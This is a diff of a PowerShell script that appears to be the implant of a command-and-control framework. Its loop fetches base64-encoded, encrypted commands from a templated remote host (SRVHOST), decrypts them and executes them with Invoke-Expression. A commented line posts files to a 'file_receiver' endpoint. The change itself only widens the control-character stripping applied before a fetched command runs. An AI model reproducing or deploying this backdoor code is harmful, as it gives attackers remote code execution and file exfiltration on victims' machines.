@@ -70,7 +70,6 @@ $wc.downloadString("OCU_PROTO://SRVHOST/first_ping");
 while($true){
     $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/command/$final_hostname");
     $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command_raw));
-
     if($command.split(" ")[0] -like "download"){
     # we need to write a download operation here !
     #Invoke-RestMethod -Uri OCU_PROTO://SRVHOST/file_receiver -Method Post -InFile $file_path -Headers @{"filename"="$file_name"};
@@ -98,7 +97,7 @@ while($true){
     try{
     $decrypted_command = (DecryptCommand $key $command);
     $uencoding = [system.Text.Encoding]::UTF8
-    $bytes_array = $uencoding.GetBytes($decrypted_command.Trim([char]0x0008))
+    $bytes_array = $uencoding.GetBytes($decrypted_command.Trim([char]0x0008).Trim([char]0x0003).Trim([char]0x0000).Trim([char]0x0002).Trim([char]0x0005).Trim([char]0x0006).Trim([char]0x0007))
     $en = [system.Text.Encoding]::ASCII
     $final_command = $en.GetString($bytes_array)
     $ec = Invoke-Expression ($final_command) | Out-String;
